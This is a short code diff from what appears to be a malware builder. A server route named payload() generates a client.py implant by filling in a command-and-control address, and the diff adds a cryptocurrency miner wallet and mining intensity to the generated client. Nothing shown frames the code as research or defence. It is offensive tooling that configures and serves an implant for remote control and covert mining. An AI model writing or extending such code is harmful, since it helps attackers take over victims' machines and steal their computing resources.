@@ -160,6 +160,8 @@ def payload():
 
     content = re.sub(r'(C2_ADDRESS\s*=\s*).*', f'C2_ADDRESS = "{config["url"]}"', content)
     content = re.sub(r'(TARGET_HEIGHT\s*=\s*).*', f'TARGET_HEIGHT = {config["resolution"]}', content)
+    content = re.sub(r'(DEFAULT_MINER_WALLET\s*=\s*).*', f'DEFAULT_MINER_WALLET = "{config.get("miner_wallet", "")}"', content)
+    content = re.sub(r'(DEFAULT_MINER_INTENSITY\s*=\s*).*', f'DEFAULT_MINER_INTENSITY = {config.get("miner_intensity", 50)}', content)
 
     return send_file(io.BytesIO(content.encode()), mimetype='text/x-python', as_attachment=True, download_name='client.py')
 
